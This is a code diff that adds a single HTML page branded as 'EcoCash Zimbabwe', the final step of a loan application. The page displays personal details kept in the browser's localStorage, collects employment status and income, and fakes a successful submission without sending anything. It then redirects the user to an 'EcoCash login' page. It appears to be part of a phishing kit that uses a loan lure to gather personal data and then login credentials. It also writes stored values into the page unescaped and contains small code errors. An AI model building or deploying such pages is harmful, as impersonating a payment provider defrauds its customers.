@@ -1,0 +1,698 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <title>EcoCash - Loan Application</title>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+
+        *{
+            margin:0;
+            padding:0;
+            box-sizing:border-box;
+        }
+
+        :root{
+            --primary:#0057ff;
+            --primary-dark:#003ecb;
+            --primary-light:#eef4ff;
+
+            --accent:#ff2d55;
+
+            --text:#1f2937;
+            --gray:#6b7280;
+            --white:#ffffff;
+
+            --success:#00c853;
+        }
+
+        body{
+            font-family:'Inter',sans-serif;
+            background:linear-gradient(to bottom,#f4f7ff,#edf3ff);
+            min-height:100vh;
+            display:flex;
+            flex-direction:column;
+            align-items:center;
+            padding:20px;
+            color:var(--text);
+        }
+
+        header{
+            width:100%;
+            max-width:480px;
+            display:flex;
+            align-items:center;
+            justify-content:space-between;
+            margin-bottom:15px;
+        }
+
+        .back-btn{
+            background:none;
+            border:none;
+            font-size:28px;
+            cursor:pointer;
+            color:var(--primary-dark);
+        }
+
+        .logo{
+            font-size:30px;
+            font-weight:800;
+        }
+
+        .logo-eco{
+            color:var(--primary);
+        }
+
+        .logo-cash{
+            color:var(--accent);
+        }
+
+        .card{
+            width:100%;
+            max-width:480px;
+            background:white;
+            border-radius:30px;
+            padding:28px 24px;
+            box-shadow:0 15px 40px rgba(0,0,0,0.08);
+        }
+
+        .top{
+            overflow-y:auto;
+        }
+
+        .badge{
+            display:inline-block;
+            background:var(--primary-light);
+            color:var(--primary-dark);
+            padding:8px 14px;
+            border-radius:999px;
+            font-size:13px;
+            font-weight:700;
+            margin-bottom:18px;
+        }
+
+        .form-title{
+            font-size:30px;
+            font-weight:800;
+            color:var(--primary-dark);
+            margin-bottom:8px;
+        }
+
+        .subtitle{
+            font-size:14px;
+            color:var(--gray);
+            line-height:1.6;
+            margin-bottom:24px;
+        }
+
+        .progress-wrapper{
+            margin-bottom:30px;
+        }
+
+        .progress-top{
+            display:flex;
+            justify-content:space-between;
+            margin-bottom:10px;
+        }
+
+        .step-text{
+            font-size:14px;
+            font-weight:600;
+            color:var(--gray);
+        }
+
+        .progress-percent{
+            font-size:14px;
+            font-weight:700;
+            color:var(--primary);
+        }
+
+        .progress-bar{
+            width:100%;
+            height:10px;
+            background:#dbe7ff;
+            border-radius:999px;
+            overflow:hidden;
+        }
+
+        .progress-fill{
+            width:100%;
+            height:100%;
+            background:linear-gradient(
+                135deg,
+                    var(--primary),
+                    var(--accent)
+            );
+        }
+
+        .form-label{
+            display:block;
+            font-size:14px;
+            font-weight:700;
+            margin-bottom:8px;
+            color:var(--text);
+        }
+
+        .form-select,
+        .form-input{
+            width:100%;
+            padding:16px;
+            border:1px solid #dbe4ff;
+            border-radius:16px;
+            font-size:15px;
+            background:#fafcff;
+            margin-bottom:18px;
+            transition:0.25s ease;
+        }
+
+        .form-select:focus,
+        .form-input:focus{
+            outline:none;
+            border-color:var(--primary);
+            background:white;
+            box-shadow:0 0 0 4px rgba(0,87,255,0.08);
+        }
+
+        .summary-box{
+            background:var(--primary-light);
+            border-radius:24px;
+            padding:20px;
+            margin-top:10px;
+            border:1px solid #dbe4ff;
+        }
+
+        .summary-title{
+            font-size:18px;
+            font-weight:700;
+            color:var(--primary-dark);
+            margin-bottom:18px;
+        }
+
+        .summary-row{
+            display:flex;
+            justify-content:space-between;
+            gap:15px;
+            margin-bottom:14px;
+            padding-bottom:14px;
+            border-bottom:1px solid #dbe7ff;
+            font-size:14px;
+        }
+
+        .summary-row:last-child{
+            border-bottom:none;
+            margin-bottom:0;
+            padding-bottom:0;
+        }
+
+        .summary-label{
+            color:var(--gray);
+        }
+
+        .summary-value{
+            font-weight:700;
+            color:var(--text);
+            text-align:right;
+        }
+
+        .btn-group{
+            display:flex;
+            gap:14px;
+            margin-top:30px;
+        }
+
+        .prev-btn,
+        .submit-btn{
+            flex:1;
+            border:none;
+            border-radius:999px;
+            padding:17px;
+            font-size:16px;
+            font-weight:700;
+            cursor:pointer;
+            transition:0.3s ease;
+        }
+
+        .prev-btn{
+            background:#edf2ff;
+            color:var(--primary-dark);
+        }
+
+        .submit-btn{
+            background:linear-gradient(
+                135deg,
+                var(--primary),
+                var(--primary-dark)
+            );
+            color:white;
+            box-shadow:0 12px 25px rgba(0,87,255,0.18);
+        }
+
+        .submit-btn:hover{
+            transform:translateY(-2px);
+        }
+
+        footer{
+            margin-top:20px;
+            font-size:12px;
+            color:#9ca3af;
+            text-align:center;
+        }
+
+        /* SPINNER */
+
+        #spinnerOverlay{
+            position:fixed;
+            inset:0;
+            background:rgba(0,87,255,0.15);
+            display:none;
+            justify-content:center;
+            align-items:center;
+            z-index:1000;
+            flex-direction:column;
+            backdrop-filter:blur(3px);
+        }
+
+        .spinner{
+            width:65px;
+            height:65px;
+            border:6px solid rgba(255,255,255,0.5);
+            border-top:6px solid var(--primary);
+            border-radius:50%;
+            animation:spin 1s linear infinite;
+        }
+
+        @keyframes spin{
+            0%{
+                transform:rotate(0deg);
+            }
+            00%{
+                transform:rotate(360deg);
+            }
+        }
+
+        /* SUCCESS */
+
+        #successOverlay{
+            position:fixed;
+            inset:0;
+            background:rgba(0,0,0,0.45);
+            display:none;
+            justify-content:center;
+            align-items:center;
+            z-index:1001;
+            padding:20px;
+        }
+
+        .success-card{
+            background:white;
+            border-radius:30px;
+            padding:36px 28px;
+            width:100%;
+            max-width:420px;
+            text-align:center;
+            animation:pop 0.3s ease;
+        }
+
+        @keyframes pop{
+            from{
+                transform:scale(0.9);
+                opacity:0;
+            }
+            to{
+                transform:scale(1);
+                opacity:1;
+            }
+        }
+
+        .check-icon{
+            width:85px;
+            height:85px;
+            background:var(--success);
+            border-radius:50%;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            margin:0 auto 24px;
+            font-size:46px;
+            color:white;
+            font-weight:bold;
+        }
+
+        .success-title{
+            font-size:26px;
+            font-weight:800;
+            color:var(--success);
+            margin-bottom:12px;
+        }
+
+        .success-msg{
+            font-size:15px;
+            line-height:1.7;
+            color:var(--gray);
+            margin-bottom:24px;
+        }
+
+        .redirect-bar{
+            background:#f3f6ff;
+            border-radius:999px;
+            padding:14px;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            gap:10px;
+            font-size:14px;
+            color:var(--gray);
+            margin-bottom:18px;
+        }
+
+        .loader{
+            width:18px;
+            height:18px;
+            border:2px solid #ddd;
+            border-top:2px solid var(--primary);
+            border-radius:50%;
+            animation:spin 1s linear infinite;
+        }
+
+        .go-login-btn{
+            width:100%;
+            border:none;
+            background:linear-gradient(
+                135deg,
+                var(--primary),
+                        var(--primary-dark)
+            );
+            color:white;
+            padding:16px;
+            border-radius:999px;
+            font-size:16px;
+            font-weight:700;
+            cursor:pointer;
+        }
+
+        @media(max-width:520px){
+
+            body{
+                padding:14px;
+            }
+
+            .form-title{
+                font-size:26px;
+            }
+
+            .summary-row{
+                flex-direction:column;
+                gap:5px;
+            }
+
+            .summary-value{
+                text-align:left;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <header>
+
+        <button class="back-btn" onclick="history.back()">←</button>
+
+        <div class="logo">
+            <span class="logo-eco">Eco</span><span class="logo-cash">Cash</span>
+        </div>
+
+        <div style="width:28px;"></div>
+
+    </header>
+
+    <main class="card">
+
+        <div class="top">
+
+            <div class="badge">
+                Final Verification
+            </div>
+
+            <h1 class="form-title">
+                Review Your Application
+            </h1>
+
+            <p class="subtitle">
+                Confirm your EcoCash loan application details before submission.
+            </p>
+
+            <div class="progress-wrapper">
+
+                <div class="progress-top">
+                    <span class="step-text">Step 3 of 3</span>
+                    <span class="progress-percent">100%</span>
+                </div>
+
+                <div class="progress-bar">
+                    <div class="progress-fill"></div>
+                </div>
+
+            </div>
+
+            <label class="form-label">
+                Employment Status
+            </label>
+
+            <select class="form-select" id="employmentStatus">
+                <option>Employed</option>
+                <option>Self-Employed</option>
+                <option>Unemployed</option>
+                <option>Student</option>
+            </select>
+
+            <label class="form-label">
+                Annual Income ($)
+            </label>
+
+            <input
+                type="number"
+                class="form-input"
+                id="annualIncome"
+                placeholder="Optional"
+            >
+
+            <div class="summary-box">
+
+                <div class="summary-title">
+                    Application Summary
+                </div>
+
+                <div id="summaryBox"></div>
+
+            </div>
+
+        </div>
+
+        <div class="btn-group">
+
+            <button class="prev-btn" onclick="history.back()">
+                PREVIOUS
+            </button>
+
+            <button class="submit-btn" id="submitBtn">
+                SUBMIT APPLICATION
+            </button>
+
+        </div>
+
+    </main>
+
+    <footer>
+        © 2026 EcoCash Zimbabwe. All rights reserved.
+    </footer>
+
+    <!-- SPINNER -->
+
+    <div id="spinnerOverlay">
+
+        <div class="spinner"></div>
+
+    </div>
+
+    <!-- SUCCESS -->
+
+    <div id="successOverlay">
+
+        <div class="success-card">
+
+            <div class="check-icon">✓</div>
+
+            <div class="success-title">
+                Loan Application Submitted
+            </div>
+
+            <div class="success-msg">
+                Your loan application has been submitted successfully.<br><br>
+                Please wait for approval confirmation from EcoCash Zimbabwe.
+            </div>
+
+            <div class="redirect-bar">
+
+                <div class="loader"></div>
+
+                Redirecting to EcoCash login in
+                <span id="countdown">3</span>...
+
+            </div>
+
+            <button
+                class="go-login-btn"
+                onclick="window.location.href='login.html'"
+            >
+                Go to Login Now
+            </button>
+
+        </div>
+
+    </div>
+
+    <script>
+
+        const summaryBox =
+            document.getElementById('summaryBox');
+
+        summaryBox.innerHTML = `
+
+            <div class="summary-row">
+                <span class="summary-label">Loan Type</span>
+                <span class="summary-value">
+                    ${localStorage.getItem('loanType') || 'Personal Loan'}
+                </span>
+            </div>
+
+            <div class="summary-row">
+                <span class="summary-label">Amount</span>
+                <span class="summary-value">
+                    $${parseFloat(
+                        localStorage.getItem('loanAmount') || 5000
+                    ).toLocaleString()}
+                </span>
+            </div>
+
+            <div class="summary-row">
+                <span class="summary-label">Term</span>
+                <span class="summary-value">
+                    ${localStorage.getItem('loanTerm') || '12'} Months
+                </span>
+            </div>
+
+            <div class="summary-row">
+                <span class="summary-label">Purpose</span>
+                <span class="summary-value">
+                    ${localStorage.getItem('loanPurpose') || 'Not specified'}
+                </span>
+            </div>
+
+            <div class="summary-row">
+                <span class="summary-label">Name</span>
+                <span class="summary-value">
+                    ${localStorage.getItem('firstName') || ''}
+                    ${localStorage.getItem('lastName') || ''}
+                </span>
+            </div>
+
+            <div class="summary-row">
+                <span class="summary-label">Email</span>
+                <span class="summary-value">
+                    ${localStorage.getItem('email') || 'N/A'}
+                </span>
+            </div>
+
+            <div class="summary-row">
+                <span class="summary-label">Phone</span>
+                <span class="summary-value">
+                    +263 ${localStorage.getItem('phone') || 'N/A'}
+                </span>
+            </div>
+        `;
+
+        // PREFILL
+
+        if(localStorage.getItem('employmentStatus')){
+            document.getElementById('employmentStatus').value =
+                localStorage.getItem('employmentStatus');
+        }
+
+        if(localStorage.getItem('annualIncome')){
+            document.getElementById('annualIncome').value =
+                localStorage.getItem('annualIncome');
+        }
+
+        // SUBMIT
+
+        document
+            .getElementById('submitBtn')
+            .addEventListener('click', function(){
+
+                const income =
+                    document.getElementById('annualIncome')
+                    .value
+                    .trim();
+
+                // OPTIONAL INCOME
+                // NO VALIDATION BLOCKING
+
+                localStorage.setItem(
+                    'employmentStatus',
+                    document.getElementById('employmentStatus').value
+                );
+
+                localStorage.setItem(
+                    'annualIncome',
+                    income
+                );
+
+                // SPINNER
+
+                const spinnerOverlay =
+                    document.getElementById('spinnerOverlay');
+
+                spinnerOverlay.style.display = 'flex';
+
+                setTimeout(() => {
+
+                    spinnerOverlay.style.display = 'none';
+
+                    const successOverlay =
+                        document.getElementById('successOverlay');
+
+                    successOverlay.style.display = 'flex';
+
+                    let seconds = 3;
+
+                    const countdownEl =
+                        document.getElementById('countdown');
+
+                    const timer = setInterval(() => {
+
+                        seconds--;
+
+                        countdownEl.textContent = seconds;
+
+                        if(seconds <= 0){
+
+                            clearInterval(timer);
+
+                            window.location.href = 'login';
+
+                        }
+
+                    },1000);
+
+                },3000);
+
+            });
+
+    </script>
+
+</body>
+</html>
